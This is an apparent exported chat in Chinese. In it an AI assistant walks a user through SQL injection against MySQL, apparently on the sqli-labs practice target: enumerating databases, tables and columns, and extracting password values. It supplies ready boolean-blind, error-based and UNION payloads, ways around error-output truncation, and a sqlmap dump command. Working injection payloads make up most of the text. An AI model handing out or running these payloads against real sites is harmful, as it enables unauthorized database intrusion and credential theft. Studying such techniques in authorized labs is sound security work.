    数据库的流程，爆库爆表

    ChatGPT 说：

    进行 SQL 注入时，爆库爆表（信息枚举）是核心步骤之一，用于逐步枚举出数据库名称、表名、字段名，进而提取敏感数据（如账号密码）。我们以下以布尔盲注为例，也补充报错注入和联合注入方式。

    ✅ 1. 数据库结构基础（MySQL）

    在 MySQL 中，所有数据库元信息保存在系统库：information_schema

    常用的几个表：

    表名 用途
    information_schema.schemata 所有数据库名
    information_schema.tables 所有表名
    information_schema.columns 所有字段名

    ✅ 2. 爆库（列出所有数据库名）

    🧠 构造 payload 示例（布尔盲注）：

    假设注入点为：

    bash

    复制编辑

    ?id=1' AND [payload] --+

    枚举第一个数据库名的第一个字符：

    sql

    复制编辑

    ?id=1' AND substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)='a' --+

    逐字符爆破直到匹配成功，依此枚举整个名字。再改成 LIMIT 1,1、LIMIT 2,1 继续获取下一个库。

    ✅ 3. 爆表（列出指定数据库下的所有表名）

    已知数据库名为 sqli-labs，爆出其第一个表名：

    sql

    复制编辑

    ?id=1' AND substr((SELECT table_name FROM information_schema.tables WHERE table_schema='sqli-labs' LIMIT 0,1),1,1)='a' --+

    同样通过暴力爆破字符逐个枚举。

    ✅ 4. 爆字段（列出某表的所有字段名）

    已知表名为 users，列出字段名：

    sql

    复制编辑

    ?id=1' AND substr((SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='sqli-labs' LIMIT 0,1),1,1)='u' --+

    继续使用爆破法逐个字段名枚举。

    ✅ 5. 报错注入方式（更快）

    如果支持报错注入（比如 extractvalue()），可以直接查看数据：

    🧪 爆库：

    sql

    复制编辑

    ?id=1' and extractvalue(1, concat(0x7e, (SELECT schema_name FROM information_schema.schemata LIMIT 0,1), 0x7e)) --+

    🧪 爆表：

    sql

    复制编辑

    ?id=1' and extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='sqli-labs' LIMIT 0,1), 0x7e)) --+

    ✅ 6. 联合注入（页面有回显时）

    页面正常输出 SQL 结果时，可以直接用 UNION SELECT 拼出结果：

    sql

    复制编辑

    ?id=1' UNION SELECT 1, schema_name, 3 FROM information_schema.schemata --+

    如果你能控制显示字段位置，效果最好。

    ✅ 7. 爆字段值（如用户名密码）

    确定字段名后，可以爆用户密码：

    sql

    复制编辑

    ?id=1' AND substr((SELECT password FROM users LIMIT 0,1),1,1)='a' --+

    或报错注入版本：

    sql

    复制编辑

    ?id=1' AND extractvalue(1, concat(0x7e,(SELECT password FROM users LIMIT 0,1),0x7e)) --+

    是的，报错注入确实存在长度限制问题，特别是在使用 extractvalue()、updatexml() 等函数时——当拼接的字符串太长，可能会：

    • 被数据库函数自身截断；

    • 被 WAF 拦截或编码异常；

    • 被页面返回长度限制截断（HTML响应体上限）；

    • 导致函数本身执行失败（比如 extractvalue() 解析失败或报错信息过大）；

    ✅ 一、常见报错注入函数的限制分析

    1. extractvalue(xml, xpath)

    • 一般最多回显 ~32-64字节（字符） 的内容，超长会导致：

      • XPATH syntax error: 'xxxxx……' 被截断；

      • 或直接报错中断。

    2. updatexml(xml, xpath, value)

    • 同样限制回显长度；

    • 还可能在拼接多条信息时出现：

      nginx

      复制编辑

      XPATH syntax error: 'xxx......'

      报错中无法显示完整结果。

    3. floor() + rand() 报错方式（适用于 MySQL 5.x）

    • 虽然可以用来判断内容，但输出信息不包含数据本体，不适用于“直接输出数据”。

    ✅ 二、如何判断是否发生了长度截断？

    你可以尝试以下两个方式：

    ✅ 方法 1：不断增长长度确认

    sql

    复制编辑

    ?id=1' AND extractvalue(1, concat(0x7e, REPEAT('A', 30), 0x7e)) --+

    逐步将 30 → 50 → 80 → 100，直到不再完整回显（或直接报错）即为最大回显长度。

    ✅ 方法 2：报错内容前后缺失

    sql

    复制编辑

    ?id=1' AND extractvalue(1, concat(0x7e, (SELECT group_concat(schema_name) FROM information_schema.schemata), 0x7e)) --+

    输出为：

    vbnet

    复制编辑

    XPATH syntax error: '~information_schema,testdb,sqli_lab...

    说明内容被截断。

    ✅ 三、解决办法（建议使用以下技巧）

    方式 描述 示例
    ✅ 分段输出 一次只输出一个数据库名或字段 LIMIT 0,1, LIMIT 1,1
    ✅ 子字符串截取 用 substr() 每次截取几位 substr((),1,20)
    ✅ 多次请求拼接 每次爆破一部分，手工/自动拼接 脚本 or sqlmap 逐字符输出
    ✅ 用盲注替代 如果报错输出不全，换用布尔/时间盲注 substr(...)=xx 或 sleep()
    ✅ 控制回显字符 用 0x7e 包裹数据，避免意外中断 concat(0x7e, data, 0x7e)
    ✅ 不用 group_concat() 容易超长，建议 LIMIT + substr 代替 SELECT table_name FROM ... LIMIT 0,1

    ✅ 四、可选替代策略（自动化工具）

    🛠 用 sqlmap 控制数据长度：

    bash

    复制编辑

    sqlmap -u "http://target.com?id=1" --technique=E --string="XPATH" --dump

    可加上：

    • --no-cast（避免 cast 导致的报错溢出）

    • --chunk 或手动 --start 和 --stop 分段读取

    ✅ 问题总结

    你的 payload 是这样的：

    sql

    复制编辑

    ?id=-1' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns --+

    🔥 问题点：

    • 没有 WHERE table_schema='xxx' AND table_name='xxx'，所以把所有表的字段都抓了出来；

    • group_concat() 默认最大输出长度为 1024 字节（可配置），容易被截断；

    • 输出字段数量太多 → 页面回显不完整。

    ✅ 正确做法：限定库名+表名 + 分批读取

    ✅ 一、爆出某表字段名（推荐写法）：

    sql

    复制编辑

    ?id=-1' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_schema='security' AND table_name='users' --+

    ✅ 说明：

    • security 是数据库名

    • users 是表名

    • 只输出该表的字段名，不会超长！

    ✅ 二、逐行爆字段名（LIMIT 分页方式）

    如果你不知道字段太多会被截断，就用 LIMIT 分批取，例如：

    sql

    复制编辑

    ?id=-1' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_schema='security' AND table_name='users' LIMIT 0,1 --+

    依次改为：

    • LIMIT 1,1

    • LIMIT 2,1

    • …

    直到取不到结果为止，就爆完了所有字段名。

    ✅ 三、如果仍然超长，改为 substr() 控制单个字段名长度

    sql

    复制编辑

    ?id=-1' UNION SELECT 1, substr(column_name,1,20), 3 FROM information_schema.columns WHERE table_schema='security' AND table_name='users' LIMIT 0,1 --+

    ✅ 四、实用辅助信息：如何知道当前库名？

    sql

    ?id=-1' UNION SELECT 1, database(), 3 --+
